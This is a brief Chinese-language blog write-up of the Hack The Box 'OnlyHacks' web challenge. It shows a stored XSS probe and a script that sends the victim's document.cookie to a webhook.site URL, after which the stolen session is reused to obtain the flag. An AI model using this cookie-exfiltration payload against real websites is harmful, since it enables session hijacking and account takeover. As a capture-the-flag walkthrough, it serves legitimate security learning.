---
description: 最近好無聊玩一下？
title: Hack The Box Challenge 2025/02/19
pubDate: 2025-02-19 15:20:54
tags:
  -  writeup
categories:
    - Daily
---

## OnlyHacks
一個超詭異的社交網站
![image](https://hackmd.io/_uploads/rJ8_Obm9yx.png)
就先來註冊一下
![image](https://hackmd.io/_uploads/SyOpO-X9yl.png)
真的感覺超詭異的，~~我是全部按讚拉~~

![image](https://hackmd.io/_uploads/S1cAYZQcyl.png)

沒想到可以直接alert出來？
`<script>alert(1)</script>`


那我就直接偷他cookie
```javascript
<script>
    fetch("https://webhook.site/5044eec5-2a49-4e50-82af-f91c57344da0?cookie=" + document.cookie);
</script>
```
![image](https://hackmd.io/_uploads/rkhp9b7cye.png)
cookie get!

直接把session換掉
![image](https://hackmd.io/_uploads/SkltiZQ9yl.png)
flag就出來了